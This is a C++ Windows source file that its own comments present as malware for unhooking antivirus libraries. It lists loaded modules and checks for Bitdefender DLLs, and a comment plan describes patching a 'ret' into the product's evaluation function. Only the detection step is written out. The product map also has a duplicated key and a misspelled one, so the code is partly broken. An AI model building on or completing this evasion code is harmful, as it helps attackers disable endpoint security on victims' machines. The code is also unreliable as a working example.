#include <iostream>
#include <Windows.h>
#include <wtsapi32.h>
#include <tchar.h>
#include <psapi.h>
#include <unordered_map>
#include <deque>

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Wtsapi32.lib")

using namespace std;

// C++ Malware that unload from all the current and future processes some specifyc security libraries 
// 1. Get all the DLL's loaded injected in the current process
// 2. Get the used address in AV hooks to jmp to the evaluation function
// 3. Add a ret instruction to the evaluation function

using namespace std;

unordered_map<string, string> Products = {
	{"Bitdefender", "atcuf64.dll"},
	{"Bitdenfender", "atcuf32.dll"},
	{"Bitdefender", "bdhkm64.dll" },
};

bool bitdefenderFound = false;

deque<string> ListModules() {
	deque<string> modules = {};
	modules.begin();
	// Get the list of all the modules loaded in the current process
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	unsigned int i;

	// Get a handle to the current process
	hProcess = GetCurrentProcess();

	// Get the list of all the modules loaded in the current process
	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];

			// Get the full path to the module's file
			if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
			{
				std::string modName;
				wstring ws(szModName);
				modName.assign(ws.begin(), ws.end());
				modules.push_back(modName);
			}
		}
	}
	return modules;
}

int main(int argc, char* argv[])
{
	// 1. Get all the DLL's loaded injected in the current process
	deque<string> modules = ListModules();


	for (auto& module : modules) {
		for (auto& product : Products) {
			if (module.find(product.second) != string::npos) {
				cout << "Found " << product.first << endl;
				if (product.first == "Bitdefender") {
					bitdefenderFound = true;
				}
			}
		}
	}
}
